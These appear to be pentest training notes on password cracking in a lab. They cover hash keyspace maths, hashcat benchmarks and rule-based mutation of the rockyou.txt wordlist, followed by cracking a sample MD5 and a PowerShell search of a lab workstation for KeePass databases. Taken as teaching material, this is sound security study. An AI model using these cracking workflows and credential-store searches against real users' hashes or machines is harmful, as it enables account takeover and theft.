+&lt;p&gt;The majority of common hash algos, i.e. SHA1 and MD5, are cryptographic hash functions.  They are &lt;a href=&quot;https://en.wikipedia.org/wiki/One-way_function&quot;&gt;one-way finctions&lt;/a&gt;, trivial to generate but prohibitively difficult to reverse to plaintext from the hash.  We will focus on cryptographic hash functions primarily.&lt;/p&gt;
+&lt;p&gt;Hashing is leveraged in infosec.  When a user registers an account and sets a password, the password is typically hashed and stored in a DB.  This prevents the site admin (or an attacker) from accessing the plaintext password.&lt;/p&gt;
+&lt;p&gt;During login, the supplied password is hashed and compared to the hash in the DB.  If the match, the password is correct.&lt;/p&gt;
+&lt;p&gt;App and user passwords are more often than not encrypted or hashed for protection.  To dec an enc password we need to determine the key used to enc.  To determine the plaintext of a hash we must run plaintext passwords through the hash algo and compare the returned hash to the target hash.  &lt;strong&gt;Password cracking&lt;/strong&gt; attacks are typically performed on a dedicated system, it is time consuming and should run in parralell with other actions during a pentest.&lt;/p&gt;
+&lt;p&gt;Unlike dict attacks, password cracking is quiet, doesn not lock accounts by failed attempts, and is unaffected by countermeasures.&lt;/p&gt;
+&lt;p&gt;Example, if we gain access to a &lt;a href=&quot;https://en.wikipedia.org/wiki/SHA-2&quot;&gt;SHA-256&lt;/a&gt; password hash with value:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6&quot;&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can use &lt;code&gt;sha256sum&lt;/code&gt; to hash password attempts and compare the results.  If we hash &lt;code&gt;secret&lt;/code&gt; twice and &lt;code&gt;secret1&lt;/code&gt;, using &lt;code&gt;echo -n&lt;/code&gt; to strip the newline (which would be added to the string, modifying the hash) we can see that the two &lt;code&gt;secret&lt;/code&gt; hashes are the same.  The &lt;code&gt;secret1&lt;/code&gt; hash is completely different, despite the similar input, showing us that plaintext &lt;code&gt;secret1&lt;/code&gt; is not associated with the first hash.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ echo -n &amp;quot;secret&amp;quot; | sha256sum
+2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -
+
+kali@kali:~$ echo -n &amp;quot;secret&amp;quot; | sha256sum
+2bb80d537b1da3e38bd30361aa855686bde0eacd7162fef6a25fe97bf527a25b  -
+
+kali@kali:~$ echo -n &amp;quot;secret1&amp;quot; | sha256sum
+5b11618c2e44027877d0cd0921ed166b9f176f50587fc91e7534dd2946db77d6  -
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;This is sufficient for us to understand the process, but unwieldy in execution.  There are tools available to us for streamlining the process, two of the most popular are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Hashcat.&lt;/li&gt;
+&lt;li&gt;Mainly GPU based tool.&lt;/li&gt;
+&lt;li&gt;Requires.
+    - &lt;a href=&quot;https://en.wikipedia.org/wiki/OpenCL&quot;&gt;OpenCL&lt;/a&gt;
+    - &lt;a href=&quot;https://developer.nvidia.com/cuda-toolkit&quot;&gt;CUDA&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Also supports CPU.&lt;/li&gt;
+&lt;li&gt;JtR.&lt;/li&gt;
+&lt;li&gt;CPU based tool.&lt;/li&gt;
+&lt;li&gt;Also supports GPU.
+GPU cracking is much faster than CPU, since GPUs contain thousands of cores to distribute the workload.  Note that some slow hash algos, like &lt;a href=&quot;https://en.wikipedia.org/wiki/Bcrypt&quot;&gt;bcrypt&lt;/a&gt;, work better on CPU.  Both tools are important to learn, they support different algos.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Before we begin, we can calculate the cracking time of various hashes by dividing the &lt;a href=&quot;https://www.hypr.com/security-encyclopedia/key-space&quot;&gt;keyspace&lt;/a&gt; with the hash rate.  The keyspace consists of the char set to the power of the len of the plaintext input.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Keyspace example.&lt;/li&gt;
+&lt;li&gt;Lower-case latin: 26 chars.&lt;/li&gt;
+&lt;li&gt;Upper-case latin: 26 chars.&lt;/li&gt;
+&lt;li&gt;Numbers 0-9: 10 chars.&lt;/li&gt;
+&lt;li&gt;Result 62 variations for each plaintext char.&lt;/li&gt;
+&lt;li&gt;A 5 char password = 62^5 possible passwords.&lt;/li&gt;
+&lt;li&gt;916132832 possibilities.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~$ echo -n &amp;quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&amp;quot; | wc -c
+62
+
+kali@kali:~$ python3 -c &amp;quot;print(62**5)&amp;quot;
+916132832
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Hashrate example.&lt;/li&gt;
+&lt;li&gt;How many calculations per second.&lt;/li&gt;
+&lt;li&gt;We can find this with Hashcats benchmark mode.&lt;/li&gt;
+&lt;li&gt;We will concentrate on MD5, SHA1, SHA-256 for this example.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -b
+hashcat (v6.2.6) starting in benchmark mode
+
+Benchmarking uses hand-optimized kernel code by default.
+You can use it in your cracking session by setting the -O option.
+Note: Using optimized kernel code limits the maximum supported password length.
+To disable the optimized kernel code in benchmark mode, use the -w option.
+
+OpenCL API (OpenCL 3.0 PoCL 4.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1185G7 @ 3.00GHz, 14844/29752 MB (4096 MB allocatable), 8MCU
+
+Benchmark relevant options:
+===========================
+* --optimized-kernel-enable
+
+-------------------
+* Hash-Mode 0 (MD5)
+-------------------
+
+Speed.#1.........:  1358.8 MH/s (5.77ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16
+
+----------------------
+* Hash-Mode 100 (SHA1)
+----------------------
+
+Speed.#1.........:   568.9 MH/s (14.51ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16
+
+---------------------------
+* Hash-Mode 1400 (SHA2-256)
+---------------------------
+
+Speed.#1.........:   240.0 MH/s (34.80ms) @ Accel:1024 Loops:1024 Thr:1 Vec:16
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The values are in MH/s.&lt;/li&gt;
+&lt;li&gt;1 MH/s == 1,000,000 hashes per second.&lt;/li&gt;
+&lt;li&gt;We can run the benchmark on GPU.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;C:\Users\admin\Downloads\hashcat-6.2.5&amp;gt;hashcat.exe -b
+hashcat (v6.2.5) starting in benchmark mode
+...
+* Device #1: NVIDIA GeForce RTX 3090, 23336/24575 MB, 82MCU
+
+Benchmark relevant options:
+===========================
+* --optimized-kernel-enable
+
+-------------------
+* Hash-Mode 0 (MD5)
+-------------------
+
+Speed.#1.........: 68185.1 MH/s (39.99ms) @ Accel:256 Loops:1024 Thr:128 Vec:8
+
+----------------------
+* Hash-Mode 100 (SHA1)
+----------------------
+
+Speed.#1.........: 21528.2 MH/s (63.45ms) @ Accel:64 Loops:512 Thr:512 Vec:1
+
+---------------------------
+* Hash-Mode 1400 (SHA2-256)
+---------------------------
+
+Speed.#1.........:  9276.3 MH/s (73.85ms) @ Accel:16 Loops:1024 Thr:512 Vec:1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Note the speed advantage of GPU.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Calculate a SHA256 cracking time.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Keyspace 62^5 = 916,132,832.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Hashrate = X MH/s * 1,000,000.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Output in seconds.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ python                                
+Python 3.11.4 (main, Jun  7 2023, 10:13:09) [GCC 12.2.0] on linux
+Type &amp;quot;help&amp;quot;, &amp;quot;copyright&amp;quot;, &amp;quot;credits&amp;quot; or &amp;quot;license&amp;quot; for more information.
+&amp;gt;&amp;gt;&amp;gt; hacktop = 1000000 * 240
+&amp;gt;&amp;gt;&amp;gt; print(hacktop)
+240000000
+&amp;gt;&amp;gt;&amp;gt; keyspace = 916132832
+&amp;gt;&amp;gt;&amp;gt; print(keyspace / hacktop)
+3.8172201333333335
+&amp;gt;&amp;gt;&amp;gt; gpu = 1000000 * 9276.3
+&amp;gt;&amp;gt;&amp;gt; print(gpu)
+9276300000.0
+&amp;gt;&amp;gt;&amp;gt; print(keyspace / gpu)
+0.09876058687192092
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The calculations show we can calculate the entire keyspace of a 5 char password SHA256 in:&lt;/li&gt;
+&lt;li&gt;CPU: 3.8 seconds.&lt;/li&gt;
+&lt;li&gt;GPU: 0.1 seconds.&lt;/li&gt;
+&lt;li&gt;If we scale this up to 8 and 10 char password SHA256.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; keyspace = 62**8
+&amp;gt;&amp;gt;&amp;gt; print(keyspace / gpu)
+23537.41314801117
+&amp;gt;&amp;gt;&amp;gt; keyspace = 62**10
+&amp;gt;&amp;gt;&amp;gt; print(keyspace / gpu)
+90477816.14095493
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;When converted from seconds the GPU will take.&lt;/li&gt;
+&lt;li&gt;6.5 hours to calculate they keyspace of the 8 char password.&lt;ul&gt;
+&lt;li&gt;2.8 years for the 10 char!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Increasing password length, increases cracking time exponentially.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Mutating Wordlists&lt;/h5&gt;
+&lt;p&gt;Strong password policies dictating min len, char derivations, special chars, and num vals have become prevalent in recent years.  Most passwords found in common word lists will not suffice.  When attacking a target with strong policy we need to prepare the wordlist for such situations.  Once option is to mutate the passwords.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=rule_based_attack&quot;&gt;rule-based attack&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Individual rules are implemented through rule functions.&lt;/li&gt;
+&lt;li&gt;Modify existing passwords contained in the wordlist.&lt;/li&gt;
+&lt;li&gt;An individual rule consists of one or more rule functions.&lt;/li&gt;
+&lt;li&gt;Multiple rule functions will often be used in each rule.&lt;/li&gt;
+&lt;li&gt;To leverage we must craft a rule file.&lt;/li&gt;
+&lt;li&gt;Supplied to cracking tool.&lt;/li&gt;
+&lt;li&gt;Basic example.&lt;/li&gt;
+&lt;li&gt;Rule function that appends fixed chars to all passwords in a word list.&lt;/li&gt;
+&lt;li&gt;Modifies various chars.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;em&gt;Note that is does increase the size of wordlists dramatically, good cracking hardware is important, most can handle passwords with less than 8 chars easily.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;For this example:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Password policy.&lt;/li&gt;
+&lt;li&gt;Upper case letter.&lt;/li&gt;
+&lt;li&gt;Special char.&lt;/li&gt;
+&lt;li&gt;Num val.&lt;/li&gt;
+&lt;li&gt;We can check the first 10 passwords of &lt;code&gt;rockyou.txt&lt;/code&gt; to determine if they fit this requirement.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ head /usr/share/wordlists/rockyou.txt  
+123456
+12345
+123456789
+password
+iloveyou
+princess
+1234567
+rockyou
+12345678
+abc123
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;None of the first 10 passwords comply to the policy.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;We could use a rule function to mutate the passwords to fit the policy, but first we will familiarize with rule functions and how to use them on a basic example before applying to a complex wordlist.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Copy the first 10 passwords of &lt;code&gt;rockyou.txt&lt;/code&gt; to &lt;code&gt;demo.txt&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Remove all number sequences which don&amp;#39;t fit the password policy.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Use &lt;code&gt;sed&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Edit in place &lt;code&gt;-i&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Lines starting with 1 &lt;code&gt;^1&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Delete with &lt;code&gt;d&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ head /usr/share/wordlists/rockyou.txt &amp;gt; demo.txt
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ sed -i &amp;#39;/^1/d&amp;#39; demo.txt 
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat demo.txt 
+password
+iloveyou
+princess
+rockyou
+abc123
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We now have 5 passwords that we will mutate to fit the policy.&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://hashcat.net/wiki/doku.php?id=rule_based_attack&quot;&gt;Hashcat Wiki&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;List of all rule functions with examples.&lt;/li&gt;
+&lt;li&gt;If we want to add a char.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$&lt;/code&gt; function appends.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;^&lt;/code&gt; function prepends.&lt;/li&gt;
+&lt;li&gt;Both expect on char after the function.&lt;/li&gt;
+&lt;li&gt;Example, prepend 3 to every password in a file.
+- The rule function is &lt;code&gt;^3&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;When generating a password with a num val, many users simple at 1 to the end.&lt;/li&gt;
+&lt;li&gt;Therefore we will use rule function &lt;code&gt;$1&lt;/code&gt; .&lt;/li&gt;
+&lt;li&gt;Create &lt;code&gt;demo.rule&lt;/code&gt; with this function.&lt;/li&gt;
+&lt;li&gt;Escape the special char &lt;code&gt;$&lt;/code&gt; to echo it correctly.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo \$1 &amp;gt; demo.rule
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Now we can use Hascat with our wordlist mutation.&lt;/li&gt;
+&lt;li&gt;Provide rule file with &lt;code&gt;-r&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;And &lt;code&gt;--stdout&lt;/code&gt; to display mutated passwords in debug mode.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -r demo.rule --stdout demo.txt 
+password1
+iloveyou1
+princess1
+rockyou1
+abc1231
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Now for the uppercase char policy req.&lt;/li&gt;
+&lt;li&gt;When forced to use and upper case, many users capitalize the first letter.&lt;/li&gt;
+&lt;li&gt;Therefore we will use the &lt;code&gt;c&lt;/code&gt; rule function to cap the first char and convert the rest to lower.&lt;/li&gt;
+&lt;li&gt;When using multiple rules.&lt;/li&gt;
+&lt;li&gt;If rules are on the same line sep by space.&lt;/li&gt;
+&lt;li&gt;Hashcat uses them consecutively on each password.
+- Resulting in cap first char and 1 appended.&lt;/li&gt;
+&lt;li&gt;If rules are on sep lines.&lt;/li&gt;
+&lt;li&gt;Hashcat will use each rule separately.
+- Resulting in two mutated passwords for each password in the list.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:~/passwordattacks$ cat demo1.rule     
+$1 c
+       
+kali@kali:~/passwordattacks$ hashcat -r demo1.rule --stdout demo.txt
+Password1
+Iloveyou1
+Princess1
+Rockyou1
+Abc1231
+
+kali@kali:~/passwordattacks$ cat demo2.rule   
+$1
+c
+
+kali@kali:~/passwordattacks$ hashcat -r demo2.rule --stdout demo.txt
+password1
+Password
+iloveyou1
+Iloveyou
+princess1
+Princess
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Now to add the special char.&lt;/li&gt;
+&lt;li&gt;We will start with &lt;code&gt;!&lt;/code&gt;, a common special char.&lt;/li&gt;
+&lt;li&gt;Therefore we will add &lt;code&gt;$1&lt;/code&gt; to our rule file.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo \$1 c \$! &amp;gt; demo1.rule
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat demo1.rule             
+$1 c $!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We will make two rule file variations.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo \$1 c \$! &amp;gt; demo1.rule
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat demo1.rule             
+$1 c $!
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo \$! \$1 c &amp;gt; demo2.rule
+
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat demo2.rule 
+$! $1 c
+
+
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -r demo1.rule --stdout demo.txt
+Password1!
+Iloveyou1!
+Princess1!
+Rockyou1!
+Abc1231!
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -r demo2.rule --stdout demo.txt
+Password!1
+Iloveyou!1
+Princess!1
+Rockyou!1
+Abc123!1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;With this basic understanding, let&amp;#39;s assume we have retrieved an MD%:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo -n &amp;quot;f621b6c9eab51a3e2f4e167fee4c6860&amp;quot; &amp;gt; crackme.txt
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat crackme.txt      
+f621b6c9eab51a3e2f4e167fee4c6860 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We will use &lt;code&gt;rockyout.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Modify for a policy including:&lt;/li&gt;
+&lt;li&gt;Upper case letter.&lt;/li&gt;
+&lt;li&gt;Numerical value.&lt;/li&gt;
+&lt;li&gt;Special char.&lt;/li&gt;
+&lt;li&gt;Let&amp;#39;s create out rule file, &lt;code&gt;demo3.rule&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;c&lt;/code&gt; function to cap first char and lower the rest.&lt;/li&gt;
+&lt;li&gt;Append special char &lt;code&gt;$!&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;For num, the ever-popular &lt;code&gt;123&lt;/code&gt;
+ - &lt;code&gt;$1 $2 $3&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Which we will follow with our special char.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ echo \$1 \$2 \$3 c \$! &amp;gt; demo3.rule 
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ cat demo3.rule 
+$1 $2 $3 c $!
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We will run Hshcast without debugging.&lt;/li&gt;
+&lt;li&gt;Set the hash type to MD5 with &lt;code&gt;-m 0&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Then the target hash file &lt;code&gt;crackme.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;And the &lt;code&gt;rockyou.txt&lt;/code&gt; wordlist.&lt;/li&gt;
+&lt;li&gt;Followed by &lt;code&gt;-r&lt;/code&gt; and our rule file.&lt;/li&gt;
+&lt;li&gt;Ending with &lt;code&gt;--force&lt;/code&gt; to ingnore Hashcat warnings.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force
+hashcat (v6.2.6) starting
+
+...
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+f621b6c9eab51a3e2f4e167fee4c6860:Computer123!             
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: f621b6c9eab51a3e2f4e167fee4c6860
+Time.Started.....: Sun Oct  1 08:44:29 2023, (0 secs)
+Time.Estimated...: Sun Oct  1 08:44:29 2023, (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Mod........: Rules (demo3.rule)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  4489.6 kH/s (0.54ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 8192/14344385 (0.06%)
+Rejected.........: 0/8192 (0.00%)
+Restore.Point....: 0/14344385 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456123! -&amp;gt; Whitetiger123!
+Hardware.Mon.#1..: Temp: 39c Util: 12%
+
+Started: Sun Oct  1 08:44:14 2023
+Stopped: Sun Oct  1 08:44:30 2023
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;In this case we recover &lt;code&gt;Computer123!&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Not included in the default &lt;code&gt;rockyou.txt&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;It only took hashcat a few seconds on CPU.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;When attempting to create rules&lt;/strong&gt; to mutate and existing wordlist:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Always consider human behavior and convenience regarding passwords.&lt;/li&gt;
+&lt;li&gt;Most users, use a main word and modify it to fit a policy.&lt;/li&gt;
+&lt;li&gt;Often appending numbers and special chars.&lt;/li&gt;
+&lt;li&gt;When an upper case is req, most user cap the first char.&lt;/li&gt;
+&lt;li&gt;When a special char is req, most users append it to the end.&lt;/li&gt;
+&lt;li&gt;Often relying on chars on the left side of the keyboard as they are easy to reach and type.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Instead of creating rules ourselves, we can also use rules provided by Hashcat and other sources.  Hashcat includes a variety of rules in &lt;code&gt;/usr/share/hashcat/rules&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/password-attacks]
+└─$ ls /usr/share/hashcat/rules        
+best64.rule                  T0XlC_3_rule.rule
+combinator.rule              T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
+d3ad0ne.rule                 T0XlC_insert_HTML_entities_0_Z.rule
+dive.rule                    T0XlC-insert_space_and_special_0_F.rule
+generated2.rule              T0XlC-insert_top_100_passwords_1_G.rule
+generated.rule               T0XlC.rule
+hybrid                       T0XlCv2.rule
+Incisive-leetspeak.rule      toggles1.rule
+InsidePro-HashManager.rule   toggles2.rule
+InsidePro-PasswordsPro.rule  toggles3.rule
+leetspeak.rule               toggles4.rule
+oscommerce.rule              toggles5.rule
+rockyou-30000.rule           unix-ninja-leetspeak.rule
+specific.rule
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The cover a wide range of mutations.&lt;/li&gt;
+&lt;li&gt;Most useful when we don&amp;#39;t know the target&amp;#39;s password policy.&lt;/li&gt;
+&lt;li&gt;We will use predefined rules in upcoming examples.&lt;/li&gt;
+&lt;li&gt;It&amp;#39;s always most efficient to gain information about the target password policy or find typically used default policies for the target software env.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Password Manager&lt;/h5&gt;
+&lt;p&gt;Password managers create and store passwords for different services and protect them with a master password.  The master password grants access to all creds held in the manager.  Users often copy-paste from the manager or use auto-fill browser function.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Popular managers:&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://1password.com/&quot;&gt;1Password&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://keepass.info/&quot;&gt;KeePass&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Software of this type can assist users who must maintain many, complex, passwords.&lt;/li&gt;
+&lt;li&gt;It can also introduce risk.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We will demonstrate a common pentest scenario, where we have gained access to a client workstation running a passman.  We will:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Extract the passman DB.&lt;/li&gt;
+&lt;li&gt;Transform the file into Hashcat usable format.&lt;/li&gt;
+&lt;li&gt;Crack the master DB pass.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Begin by connecting to SALESWK01 lab machine via RDP, assuming we have obtained the credentials, and gain access to the desktop.  Once connected:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Check installed programs.&lt;/li&gt;
+&lt;li&gt;Since we have GUI, use &amp;quot;Apps &amp;amp; Features&amp;quot; Win function.&lt;/li&gt;
+&lt;li&gt;Win icon.&lt;/li&gt;
+&lt;li&gt;Apps.&lt;/li&gt;
+&lt;li&gt;Add or remove.&lt;/li&gt;
+&lt;li&gt;Then scroll the list to review installed programs.&lt;/li&gt;
+&lt;li&gt;We find &lt;code&gt;KeePass Password Safe 2.51.1&lt;/code&gt; on system.&lt;/li&gt;
+&lt;li&gt;If we are unfamiliar, we should research it.&lt;/li&gt;
+&lt;li&gt;We discover the KeePass DB is stored as a &lt;code&gt;.kbdx&lt;/code&gt; file.&lt;/li&gt;
+&lt;li&gt;Search the system for this extension.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Users\jason&amp;gt; Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+
+
+    Directory: C:\Users\jason\Documents
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/30/2022  10:33 AM           1982 Database.kdbx
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;User PowerShell.&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem&quot;&gt;Get-ChildItem&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Search the whole drive with &lt;code&gt;-Path C:\&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Specify file type with &lt;code&gt;-Include&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Get a list of files and sub dirs with &lt;code&gt;-File&lt;/code&gt; and &lt;code&gt;-Recurse&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Silence errors and cont exec with &lt;code&gt;-ErrorAction&lt;/code&gt; set to &lt;code&gt;SilentlyContinue&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
